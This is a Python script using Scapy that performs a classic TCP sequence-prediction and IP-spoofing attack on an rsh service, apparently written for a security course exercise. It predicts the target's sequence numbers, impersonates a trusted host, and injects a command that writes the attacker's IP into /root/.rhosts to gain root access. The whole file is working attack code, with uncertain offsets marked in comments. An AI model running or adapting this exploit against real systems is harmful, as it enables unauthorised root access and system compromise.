from scapy.all import *

import sys
import time
if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])
    my_port = 1010
    err_port = 1022 # I think this is needed to start the three-way handshake for executing the command
    rsh_port = 514
    seqStart = 1000
    attack_script = bytes(str(err_port),'utf-8') + b"\x00root\x00root\x00echo " + bytes(my_ip, 'utf-8') + b" root >> /root/.rhosts\x00"
    test = b'root\x00root\x00ls\x00'
    slep = 1
    
    #figure out SYN sequence number pattern
    my_ip = IP(src=my_ip, dst = target_ip)
    syn = TCP(sport = my_port, dport = rsh_port, flags = 'S', seq = seqStart)
    response = sr1(my_ip/syn, verbose = False)
    reset = TCP(sport = my_port, dport = rsh_port, flags = 'R')
    packet = response[0][0]
    ack = TCP(sport = my_port, dport = rsh_port, flags = 'A', seq = seqStart+1, ack=packet.seq+1)
    send(my_ip/ack)
    spoof = packet.seq + 64000
    print("first spoofed seq num:", spoof)

    #TODO: TCP hijacking with predicted sequence number
    # send initial SYN
    ip = IP(src = trusted_host_ip, dst = target_ip)
    syn = TCP(sport = my_port, dport = rsh_port, flags = 'S', seq = seqStart)
    send(ip/syn)
    time.sleep(slep)
    # use spoofed seq number to ack and send push to start 2nd three-way handshake to execute echo command
    ack = TCP(sport = my_port, dport = rsh_port, flags = 'A', seq = seqStart+1, ack=spoof+1)
    send(ip/ack)
    push = TCP(sport = my_port, dport = rsh_port, flags = 'PA', seq = seqStart+1, ack=spoof+1)
    send(ip/push/attack_script)
    time.sleep(slep)
    
    # start of 2nd three way handshake
    next_spoof = spoof + 128000 # I think because of the timing, we need to offset by 128000 instead of 64000
    print("second spoof:",next_spoof)
    #TODO: not sure what the destination port is. it looks like it is 1022 or 1023 but I'm not certain
    synack = TCP(sport = err_port, dport = err_port, flags = 'SA', seq = seqStart+10000, ack=next_spoof+1) # we use err_port to talk on 2nd three-way handshake
    send(ip/synack)
    #time.sleep(slep)
    
    # send attack script with echo command through first three-way handshake ports
    reset_err = TCP(sport = err_port, dport = err_port, flags = 'R')
    send(ip/reset)
    send(my_ip/reset)
    send(ip/reset_err)
